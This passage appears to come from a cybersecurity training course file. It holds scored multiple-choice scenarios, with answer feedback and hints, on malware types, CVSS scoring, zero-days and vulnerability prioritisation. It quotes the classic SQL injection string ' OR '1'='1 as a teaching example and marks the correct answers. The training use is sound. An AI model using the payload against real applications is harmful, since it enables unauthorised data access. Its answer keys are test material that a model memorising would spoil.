            "text": "Fileless malware - executes entirely in memory without disk artifacts",
            "feedback": "{'short': 'Correct! Memory-only execution', 'detailed': \"This is fileless malware: downloaded and executed entirely in memory, no files written to disk, uses legitimate tools (PowerShell). This evades traditional file-based antivirus. Detection requires: PowerShell logging, memory scanning, behavioral analysis, and network monitoring for C2. The lack of disk artifacts doesn't mean no malware.\", 'consequence': 'Correct identification focuses response on memory analysis, script logging, and behavioral detection.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Rootkit hiding files from detection",
            "feedback": "{'short': 'Rootkits hide existing files, fileless never creates them', 'detailed': 'Rootkits hide files/processes that DO exist - they manipulate the OS to conceal artifacts. Fileless malware never creates disk artifacts in the first place - it runs entirely in memory. The distinction matters: rootkit hunting looks for hidden files; fileless detection looks at memory and behavior.', 'consequence': 'Rootkit scanning when the malware has no files to hide.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Encrypted malware evading antivirus",
            "feedback": "{'short': 'Encryption is separate from fileless execution', 'detailed': \"Malware encryption (packers, crypters) hides the payload in an encrypted wrapper ON DISK. Fileless malware doesn't use encryption to evade - it avoids disk entirely. The encoded PowerShell is obfuscation for the script, not encryption of a disk-based payload.\", 'consequence': 'Focus on encryption/packing when the issue is memory-only execution.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "What technique describes malware that runs in memory without writing files to disk?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Fileless malware executes entirely in memory. Detection requires script logging, memory analysis, and behavioral monitoring - not file scanning."
          }
        ]
      },
      {
        "id": "decision_9",
        "sequence": 9,
        "title": "Malware vs PUP Classification",
        "situation": "Dr. Chen shows a sample: 'This program: installs a browser toolbar, changes homepage and search defaults, displays additional advertisements, was installed with user consent (buried in EULA), doesn't steal data or provide backdoor access. How should we classify this?'\n\n**Question:** How should this software be classified?",
        "options": [
          {
            "id": "A",
            "text": "Malware - it modifies system without meaningful consent",
            "feedback": "{'short': 'Consent (even buried) changes classification', 'detailed': \"The user technically consented via EULA. While the consent was not truly informed, this distinguishes it from malware which installs without ANY consent. The software is unwanted and annoying but doesn't perform clearly malicious actions (no data theft, no backdoor). This is the gray area of PUPs.\", 'consequence': 'Aggressive classification may conflict with legal/policy constraints.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Potentially Unwanted Program (PUP) - unwanted but not clearly malicious",
            "feedback": "{'short': 'Correct! PUP classification for gray-area software', 'detailed': \"This is a Potentially Unwanted Program (PUP) / Potentially Unwanted Application (PUA): installed with some form of consent (even if misleading), performs annoying but not clearly malicious actions, doesn't steal data or provide remote access. PUPs are handled differently than malware - often user choice whether to remove.\", 'consequence': 'Appropriate classification enables user-choice handling rather than forced removal.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Legitimate software - user agreed to installation",
            "feedback": "{'short': \"Buried consent and unwanted behavior isn't truly legitimate\", 'detailed': \"While technically legal, software that buries consent in EULAs and performs unwanted modifications isn't 'legitimate' in the sense of being genuinely desired. The PUP classification acknowledges that it's not quite malware but also not genuinely legitimate software.\", 'consequence': \"Allow software that users don't actually want.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Adware - displays unwanted advertisements",
            "feedback": "{'short': 'Adware is a type of PUP, not a separate category', 'detailed': \"Adware IS a type of PUP. The broader classification is PUP, which includes adware, browser hijackers, toolbars, etc. 'Adware' describes the behavior; 'PUP' is the classification category. Both are correct, but PUP is the more complete classification.\", 'consequence': 'Technically correct but PUP is the classification category.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "What classification covers software that's unwanted but not clearly malicious, often installed via bundled/deceptive consent?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "PUP (Potentially Unwanted Program) covers gray-area software: adware, browser hijackers, bundled toolbars - unwanted but with some form of consent."
          }
        ]
      },
      {
        "id": "decision_10",
        "sequence": 10,
        "title": "Comprehensive Malware Analysis",
        "situation": "Dr. Chen presents a final challenge: 'Sample analysis: spreads via phishing emails with macro documents, establishes persistence via scheduled task, uses DNS for C2 communication, downloads additional modules (banking credential stealer, email spreader), operates as part of larger botnet infrastructure. Provide comprehensive classification.'\n\n**Question:** What is the comprehensive classification of this malware?",
        "options": [
          {
            "id": "A",
            "text": "Trojan dropper - delivers other malware via phishing",
            "feedback": "{'short': 'Only describes initial delivery, not full capability', 'detailed': \"The initial infection IS via trojan (macro document), and it DOES drop additional modules. But the full picture includes: modular design, credential stealing, self-spreading capability, and botnet membership. 'Trojan dropper' captures the delivery mechanism but misses the broader functionality.\", 'consequence': 'Incomplete understanding of threat capability.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Modular botnet malware with trojan delivery, spyware payload, and worm spreading capability",
            "feedback": "{'short': 'Correct! Comprehensive multi-type classification', 'detailed': 'Complete classification: Trojan delivery (phishing/macro), modular architecture (downloads additional capabilities), spyware function (banking credential stealer), worm-like spreading (email spreader module), botnet membership (part of larger infrastructure). Modern malware often combines multiple types - comprehensive classification captures all capabilities.', 'consequence': 'Complete understanding enables comprehensive defense: email security, credential protection, network monitoring, botnet takedown coordination.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Worm - it spreads via email",
            "feedback": "{'short': \"Has worm capability but that's not the full picture\", 'detailed': \"The email spreader module gives it worm-like self-propagation capability, but the initial infection was via phishing (trojan), it has credential stealing (spyware), and it's part of a botnet. Calling it just a 'worm' misses most of its functionality.\", 'consequence': 'Focus only on email spreading when credential theft and botnet control are also threats.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Spyware - it steals banking credentials",
            "feedback": "{'short': 'Credential stealing is one function, not the full picture', 'detailed': \"The banking credential stealer is ONE module. The malware also spreads, participates in a botnet, and can download other modules. Modern modular malware can't be classified by a single function - it has multiple capabilities that must all be understood.\", 'consequence': 'Focus only on credential theft when malware has broader capabilities.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "Modern malware often combines multiple types. What capabilities does this sample have?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Look at: delivery method (trojan), payload functions (spyware, spreader), architecture (modular, botnet). Multiple classifications may apply."
          }
        ]
      }
    ],
    "glossary": {},
    "outcomes": {},
    "max_score": 250,
    "passing_score": 150
  },
  {
    "id": "D2-REM-003",
    "title": "Vulnerability Deep Dive",
    "domain": 2,
    "type": "REM",
    "difficulty": "foundational",
    "time_estimate": "30-40 minutes",
    "role": "Security Analyst Trainee",
    "organization": {
      "name": "SecureLearn Training Institute",
      "industry": "Vulnerability Management Training Lab"
    },
    "introduction": "Welcome to the Vulnerability Management fundamentals course. Marcus greets you at the training center. 'Understanding vulnerabilities - what they are, how to assess their severity, and how to prioritize remediation - is fundamental to protecting any organization. Today we'll examine different vulnerability types, learn CVSS scoring, and practice making tough prioritization decisions. By the end, you'll be able to look at scan results and know exactly what needs attention first.'",
    "learning_objectives": [
      "Explain various types of vulnerabilities",
      "Explain the purpose of mitigation techniques used to secure the enterprise"
    ],
    "decision_points": [
      {
        "id": "decision_1",
        "sequence": 1,
        "title": "Basic Vulnerability Classification",
        "situation": "Marcus starts with fundamentals. 'A web application has a flaw where user input in a search field is directly inserted into a database query without sanitization. An attacker enters: ' OR '1'='1 and retrieves all records. What type of vulnerability is this?'\n\n**Question:** What type of vulnerability allows this attack?",
        "options": [
          {
            "id": "A",
            "text": "Cross-Site Scripting (XSS) - injecting malicious code",
            "feedback": "{'short': 'XSS involves injecting JavaScript, not SQL', 'detailed': \"XSS involves injecting malicious JavaScript that executes in victims' browsers. This attack injects SQL code that executes on the database server. The target (database vs. browser) and the language (SQL vs. JavaScript) distinguish these vulnerabilities.\", 'consequence': \"Wrong mitigation focus - XSS defenses won't prevent SQL injection.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "SQL Injection - inserting SQL code via user input",
            "feedback": "{'short': 'Correct! Classic SQL injection attack', 'detailed': \"This is SQL Injection (SQLi): user input is incorporated directly into SQL queries without proper sanitization or parameterization. The payload ' OR '1'='1 modifies the query logic to return all records. SQLi can lead to data theft, authentication bypass, and even command execution on the database server.\", 'consequence': 'Correct identification enables proper remediation: parameterized queries, input validation, WAF rules.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Buffer Overflow - exceeding memory allocation",
            "feedback": "{'short': 'Buffer overflow involves memory, not query manipulation', 'detailed': \"Buffer overflow occurs when data exceeds allocated memory bounds, potentially overwriting adjacent memory and enabling code execution. This attack manipulates query LOGIC, not memory. The input isn't too long - it's SQL code designed to change query behavior.\", 'consequence': 'Completely wrong vulnerability category.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Insecure Direct Object Reference (IDOR) - accessing unauthorized records",
            "feedback": "{'short': 'IDOR involves manipulating object identifiers', 'detailed': 'IDOR involves accessing objects by manipulating identifiers (like changing user ID from 123 to 124). While the RESULT might be similar (accessing unauthorized data), the METHOD is different. IDOR manipulates legitimate parameters; SQLi injects code that changes query behavior.', 'consequence': 'Different attack vector requires different defenses.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "What type of attack involves inserting database query commands into user input fields?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "SQL Injection inserts SQL code via user input. The payload ' OR '1'='1 is a classic SQLi test pattern."
          }
        ]
      },
      {
        "id": "decision_2",
        "sequence": 2,
        "title": "CVSS Score Interpretation",
        "situation": "'Understanding CVSS is essential,' Marcus explains. 'Here's a vulnerability: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H with a score of 9.8 Critical. What does this vector string tell us about the vulnerability?'\n\n**Question:** What does this CVSS 9.8 vector string indicate?",
        "options": [
          {
            "id": "A",
            "text": "Local vulnerability requiring physical access and user interaction",
            "feedback": "{'short': 'Vector shows opposite - network exploitable, no user interaction', 'detailed': 'The vector shows: AV:N (Network - remote exploitation), PR:N (No Privileges required), UI:N (No User Interaction needed). Physical access and user interaction would lower the score significantly. This vulnerability is remotely exploitable without any prerequisites.', 'consequence': 'Misunderstanding vulnerability accessibility.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Network exploitable, no authentication required, full system compromise possible",
            "feedback": "{'short': 'Correct! Critical remote vulnerability', 'detailed': 'The vector indicates: AV:N (Network - remote), AC:L (Low complexity - easy), PR:N (No privileges - unauthenticated), UI:N (No user interaction), C:H/I:H/A:H (High impact to Confidentiality, Integrity, Availability). This is the worst case: easy remote exploitation with complete system compromise. This is why it scores 9.8 Critical.', 'consequence': 'Correct understanding enables proper prioritization - this is Tier 1 immediate.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Medium severity requiring authenticated access",
            "feedback": "{'short': 'PR:N means NO privileges required', 'detailed': \"PR:N specifically means 'Privileges Required: None' - the attacker doesn't need any authentication. The 9.8 score is Critical, not Medium. Medium would be 4.0-6.9. This vulnerability is extremely severe.\", 'consequence': 'Underestimating critical vulnerability severity.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "High severity but only affects confidentiality",
            "feedback": "{'short': 'C:H/I:H/A:H means all three CIA components are impacted', 'detailed': 'The impact metrics C:H/I:H/A:H indicate HIGH impact to Confidentiality AND Integrity AND Availability. This means complete compromise of all three security pillars - not just confidentiality. Full CIA impact is why the score is so high.', 'consequence': 'Underestimating the scope of potential impact.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "Decode the metrics: AV=Attack Vector, PR=Privileges Required, UI=User Interaction, C/I/A=Impact. N=None/Network, L=Low, H=High."
          },
          {
            "level": 2,
            "cost": 5,
            "text": "AV:N (network), AC:L (low complexity), PR:N (no auth), UI:N (no user action), all high impacts = worst case remotely exploitable vulnerability."
          }
        ]
      },
      {
        "id": "decision_3",
        "sequence": 3,
        "title": "Zero-Day Understanding",
        "situation": "Marcus presents a scenario: 'Your threat intelligence team alerts you: a new vulnerability has been discovered in your firewall vendor's software. It's being actively exploited by attackers. The vendor is aware but has not released a patch. What type of vulnerability is this?'\n\n**Question:** What type of vulnerability is this?",
        "options": [
          {
            "id": "A",
            "text": "Known vulnerability - vendor is aware of it",
            "feedback": "{'short': 'Known but unpatched with active exploitation = zero-day', 'detailed': \"While the vendor now knows about it, the defining characteristic is that NO PATCH EXISTS while it's being actively exploited. A 'known vulnerability' typically implies a patch is available. This is specifically a zero-day: the vendor has had 'zero days' to prepare defenses for their customers.\", 'consequence': 'Waiting for patch when immediate compensating controls are needed.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Zero-day vulnerability - actively exploited with no available patch",
            "feedback": "{'short': 'Correct! Zero-day = exploited before patch exists', 'detailed': \"This is a zero-day vulnerability: it's being actively exploited 'in the wild' and no patch is available. The name comes from the vendor having 'zero days' to fix the issue before attacks began. Zero-days require immediate compensating controls (isolation, monitoring, workarounds) since patching isn't possible.\", 'consequence': 'Correct identification triggers emergency response procedures and compensating control implementation.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Legacy vulnerability - affecting older software",
            "feedback": "{'short': 'Legacy refers to old/unsupported systems', 'detailed': \"Legacy vulnerabilities affect old systems that may no longer receive patches due to end-of-life. This scenario describes a CURRENT product where the vendor IS working on a fix but hasn't released it yet. The defining issue is active exploitation before patch availability = zero-day.\", 'consequence': 'Wrong categorization delays appropriate response.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Theoretical vulnerability - no active exploitation yet",
            "feedback": "{'short': 'Scenario explicitly states active exploitation', 'detailed': \"The scenario states it's 'being actively exploited by attackers.' That's not theoretical - it's real-world attacks happening now. Active exploitation with no patch is the definition of a zero-day. Theoretical would mean the vulnerability was found but no exploits exist.\", 'consequence': 'Underestimating active threat.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "What term describes a vulnerability being exploited before the vendor can provide a patch?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Zero-day: actively exploited vulnerability with no available patch. Vendor has had 'zero days' to prepare defenses."
          }
        ]
      },
      {
        "id": "decision_4",
        "sequence": 4,
        "title": "Risk-Based Prioritization",
        "situation": "'CVSS alone doesn't tell the whole story,' Marcus explains. 'You have two vulnerabilities: Vuln A is CVSS 9.8 on an internal test server with no production data. Vuln B is CVSS 7.5 on your internet-facing payment processing system. Which should you prioritize?'\n\n**Question:** Which vulnerability should be prioritized for immediate remediation?",
        "options": [
          {
            "id": "A",
            "text": "Vuln A (CVSS 9.8) - higher severity always means higher priority",
            "feedback": "{'short': \"CVSS doesn't account for business context\", 'detailed': \"CVSS measures technical severity in isolation, not actual business risk. A CVSS 9.8 on an isolated test server with no data represents LOW actual risk - there's nothing valuable to compromise and limited attack surface. CVSS must be combined with asset criticality and exposure to determine priority.\", 'consequence': 'Resources spent on low-risk system while high-risk system remains vulnerable.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Vuln B (CVSS 7.5 on payment system) - business context makes it higher risk",
            "feedback": "{'short': 'Correct! Risk = CVSS + Asset Criticality + Exposure', 'detailed': 'True risk considers: vulnerability severity (CVSS), asset criticality (payment system = critical), and exposure (internet-facing = maximum exposure). Vuln B on a critical, exposed system represents much higher actual risk than Vuln A on a low-value, internal system. Risk-based prioritization accounts for business context.', 'consequence': 'Correct prioritization protects critical business assets first.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Both equally - both are high severity",
            "feedback": "{'short': 'Resources are limited - prioritization is necessary', 'detailed': \"In theory, both should be fixed. In practice, resources are limited and you must prioritize. 'Both equally' isn't helpful when you have to choose what to fix first. The payment system represents significantly higher business risk and should be addressed before the test server.\", 'consequence': 'Lack of prioritization leads to inefficient resource allocation.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Neither - wait for more vulnerabilities to batch together",
            "feedback": "{'short': 'High severity vulnerabilities require prompt action', 'detailed': \"Both vulnerabilities are high severity and require action. 'Batching' might make sense for low-severity findings, but CVSS 7.5+ vulnerabilities, especially on critical systems, need prompt remediation. Waiting increases exposure time and risk of exploitation.\", 'consequence': 'Delayed remediation increases exposure to attack.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "Consider: What's the business impact if each system is compromised? Which is more exposed to attackers?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Risk = CVSS \u00c3\u2014 Asset Criticality \u00c3\u2014 Exposure. Internet-facing payment system with 7.5 > internal test server with 9.8."
          }
        ]
      },
      {
        "id": "decision_5",
        "sequence": 5,
        "title": "Exploit Availability Impact",
        "situation": "Marcus continues: 'Two vulnerabilities both scored CVSS 8.0. Vuln X has a Metasploit module available. Vuln Y has only a theoretical advisory from the vendor. How does exploit availability affect prioritization?'\n\n**Question:** How should exploit availability affect your prioritization?",
        "options": [
          {
            "id": "A",
            "text": "No effect - CVSS score is what matters for priority",
            "feedback": "{'short': 'Exploit availability significantly increases likelihood', 'detailed': \"CVSS base score doesn't account for whether exploits exist. A vulnerability with a weaponized Metasploit module can be exploited by anyone with basic skills, dramatically increasing likelihood of attack. Exploit availability is a critical prioritization factor beyond CVSS.\", 'consequence': 'Equal treatment when actual risk levels are very different.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Vuln X (Metasploit) should be prioritized higher - weaponized exploit means imminent threat",
            "feedback": "{'short': 'Correct! Weaponized exploits dramatically increase likelihood', 'detailed': 'When a vulnerability has a Metasploit module, exploitation is trivial - attackers literally click a button. This dramatically increases likelihood of attack compared to a theoretical vulnerability requiring custom exploit development. Exploit maturity is a key prioritization factor: actively exploited > weaponized > PoC > theoretical.', 'consequence': 'Correct prioritization addresses imminent threats first.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Vuln Y (theoretical) should be prioritized - get ahead before exploits appear",
            "feedback": "{'short': 'Address current threats before potential future threats', 'detailed': 'While being proactive is good, when one vulnerability is actively weaponized and the other is theoretical, you must address the immediate threat first. Vuln X can be exploited RIGHT NOW by anyone. Vuln Y MIGHT be exploitable someday. Focus resources on current risk.', 'consequence': 'Ignoring active threat to address potential future threat.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Both should be deprioritized - 8.0 isn't critical",
            "feedback": "{'short': '8.0 is HIGH severity requiring prompt attention', 'detailed': \"CVSS 8.0 is HIGH severity (7.0-8.9 range). Combined with a weaponized exploit, Vuln X is extremely dangerous. Deprioritizing based on 'not critical' ignores that HIGH severity vulnerabilities with public exploits are frequently exploited in attacks.\", 'consequence': 'Leaving highly exploitable vulnerabilities unaddressed.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "How does having a point-and-click exploit tool change the likelihood someone will exploit a vulnerability?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Exploit maturity hierarchy: Actively exploited > Weaponized (Metasploit) > PoC available > Theoretical. Higher maturity = higher priority."
          }
        ]
      },
      {
        "id": "decision_6",
        "sequence": 6,
        "title": "Compensating Controls",
        "situation": "'Sometimes you can't patch immediately,' Marcus notes. 'You have a critical SQL injection vulnerability in a legacy application. The vendor is out of business, no patch will ever exist, and the application supports a critical business process. What's your approach?'\n\n**Question:** How should you handle a critical vulnerability that cannot be patched?",
        "options": [
          {
            "id": "A",
            "text": "Accept the risk - nothing can be done without a patch",
            "feedback": "{'short': 'Compensating controls can reduce risk without patching', 'detailed': \"Risk acceptance should be a last resort after all mitigation options are exhausted. Compensating controls - WAF rules to block SQLi patterns, network segmentation, enhanced monitoring, input validation at the network layer - can significantly reduce risk even when patching isn't possible.\", 'consequence': 'Unnecessary risk exposure when mitigations are available.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Implement compensating controls: WAF rules, segmentation, monitoring, input validation",
            "feedback": "{'short': \"Correct! Compensating controls protect when patching isn't possible\", 'detailed': 'Compensating controls reduce risk without fixing the underlying vulnerability: WAF (block SQLi patterns at network layer), segmentation (limit who can reach the application), monitoring (detect exploitation attempts), prepared statements/input validation at proxy layer. Also: document the risk, plan for application replacement, and set review dates.', 'consequence': 'Risk significantly reduced while maintaining business operations. Plan for long-term replacement initiated.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Immediately shut down the application - security trumps business",
            "feedback": "{'short': 'Business continuity matters - find balanced solution', 'detailed': \"Shutting down a critical business application is a last resort, not a first response. Security's job is to enable business safely, not stop business entirely. Compensating controls can reduce risk to acceptable levels while the business plans for application replacement. Balance security with operational needs.\", 'consequence': 'Business disruption when alternatives exist.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Ignore it - legacy applications aren't worth securing",
            "feedback": "{'short': 'Legacy applications often hold valuable data and access', 'detailed': \"Legacy applications often support critical business processes and contain valuable data. Attackers specifically target legacy systems because they're often less protected. The 'critical business process' mentioned makes this application high value. Ignoring it creates significant organizational risk.\", 'consequence': 'Critical system left vulnerable, likely to be compromised.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "What security controls can reduce risk from a vulnerability even when you can't patch it?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Compensating controls: WAF (block attack patterns), segmentation (limit access), monitoring (detect attacks), input validation (filter at network layer)."
          }
        ]
      },
      {
        "id": "decision_7",
        "sequence": 7,
        "title": "Configuration vs Code Vulnerability",
        "situation": "Marcus shows scan results: 'Your scan found two findings on the same web server. Finding 1: SSL 3.0 enabled (CVSS 4.3). Finding 2: Code injection vulnerability in custom application (CVSS 8.5). Which is a configuration issue vs. a code vulnerability?'\n\n**Question:** Which findings are configuration vs. code vulnerabilities?",
        "options": [
          {
            "id": "A",
            "text": "Both are configuration issues - they're both on the web server",
            "feedback": "{'short': 'Code injection is an application code flaw', 'detailed': \"Code injection vulnerabilities exist in the application source code - improper handling of user input. This requires code changes to fix (input validation, parameterized queries). SSL 3.0 is a configuration issue - the server is configured to allow an outdated protocol. Location doesn't determine type.\", 'consequence': \"Wrong remediation approach - configuration change won't fix code vulnerability.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "SSL 3.0 = configuration (disable protocol), Code injection = code (fix application)",
            "feedback": "{'short': 'Correct! Configuration vs code determines remediation approach', 'detailed': 'SSL 3.0 enabled is a CONFIGURATION vulnerability - the fix is changing server configuration to disable the deprecated protocol. Code injection is a CODE vulnerability - the fix requires modifying the application source code to properly validate/sanitize input. This distinction determines who fixes it and how.', 'consequence': 'Correct categorization routes to appropriate teams: sysadmin for configuration, developers for code.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Both are code vulnerabilities - they both affect the web application",
            "feedback": "{'short': 'SSL/TLS settings are server configuration', 'detailed': \"SSL/TLS protocol settings are web SERVER configuration, not application code. You fix it by modifying server settings (Apache, Nginx, IIS configuration files), not by writing code. The web application running on the server is separate from the server's TLS configuration.\", 'consequence': 'Sending configuration issues to developers wastes time.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "SSL 3.0 = code (protocol implementation), Code injection = configuration (input handling setting)",
            "feedback": "{'short': 'Reversed categorization', 'detailed': \"This is backwards. SSL 3.0 being enabled is a configuration choice (which protocols the server accepts). Code injection is a code flaw (how the application handles input). You don't need to modify code to disable SSL 3.0 - you change a configuration file.\", 'consequence': 'Completely wrong remediation approach for both.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "Configuration issues are fixed by changing settings. Code issues require changing source code. Which is which?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "SSL 3.0: server setting to disable deprecated protocol = configuration. Code injection: fix how application handles input = code change."
          }
        ]
      },
      {
        "id": "decision_8",
        "sequence": 8,
        "title": "Vulnerability Scanning Types",
        "situation": "'Different scan types serve different purposes,' Marcus explains. 'You want to understand what an external attacker sees when targeting your organization. What type of vulnerability scan should you run?'\n\n**Question:** What scan type shows the external attacker's perspective?",
        "options": [
          {
            "id": "A",
            "text": "Authenticated internal scan - provides the most complete results",
            "feedback": "{'short': \"Authenticated internal shows defender's view, not attacker's\", 'detailed': \"Authenticated internal scans provide the most complete vulnerability inventory (useful!), but that's not what an external attacker sees. External attackers don't have credentials or internal network access. You need an unauthenticated external scan to see the attacker's view.\", 'consequence': \"Don't see what attackers actually see.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Unauthenticated external scan - mimics what an internet attacker sees",
            "feedback": "{'short': 'Correct! Unauthenticated external = attacker perspective', 'detailed': \"Unauthenticated external scanning mimics an internet attacker: scanning from outside your network without credentials. This shows what's exposed and exploitable from the internet - your actual external attack surface. This should be run regularly in addition to internal scans.\", 'consequence': 'Clear view of external attack surface - what attackers actually target.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Agent-based scan - continuous monitoring is most accurate",
            "feedback": "{'short': 'Agent-based requires installation on target systems', 'detailed': \"Agent-based scanning requires installing software on the systems being scanned. External attackers don't have agents installed on your systems. Agent-based scanning is excellent for comprehensive internal visibility but doesn't show the external attacker perspective.\", 'consequence': 'Internal perspective, not external attacker view.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Passive scanning - doesn't interact with systems, safest option",
            "feedback": "{'short': 'Passive scanning only monitors traffic', 'detailed': \"Passive scanning monitors network traffic without sending probes - useful for detecting vulnerable systems by their traffic patterns. However, it can't actively identify vulnerabilities the way an attacker would (by probing). Active external scanning is needed to see the attacker's view.\", 'consequence': 'Limited visibility of actual vulnerabilities.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "What perspective does an external attacker have? Outside your network, no credentials, probing your internet-facing systems."
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Unauthenticated external scan: from internet, no credentials, targets external-facing systems = attacker's view."
          }
        ]
      },
      {
        "id": "decision_9",
        "sequence": 9,
        "title": "False Positive Handling",
        "situation": "Marcus presents a challenge: 'Your scan reports CVE-2024-1234 (critical RCE in Apache 2.4.49) on a web server. However, you check and the server is running Apache 2.4.52. The scanner is likely reporting a false positive. How do you handle this?'\n\n**Question:** How should you handle this potential false positive?",
        "options": [
          {
            "id": "A",
            "text": "Ignore the finding - it's obviously wrong",
            "feedback": "{'short': 'Never simply ignore - validate and document', 'detailed': \"Simply ignoring findings is dangerous - what if you're wrong? What if the version check was incorrect? Proper process requires validation and documentation. If it's truly a false positive, document why and mark as such. This creates an audit trail and ensures nothing slips through.\", 'consequence': 'No documentation if finding was real, no process improvement for future scans.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Validate the finding, confirm version, document as false positive with evidence",
            "feedback": "{'short': 'Correct! Validate, verify, document', 'detailed': \"Proper false positive handling: (1) Validate the scanner finding against actual system state, (2) Verify using multiple methods (check installed version, examine files), (3) Document the evidence proving it's false, (4) Mark in vulnerability management system with explanation. This creates audit trail and helps tune scanning.\", 'consequence': 'Clear documentation, audit trail maintained, future scans can be tuned.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Patch anyway - critical vulnerabilities should always be addressed",
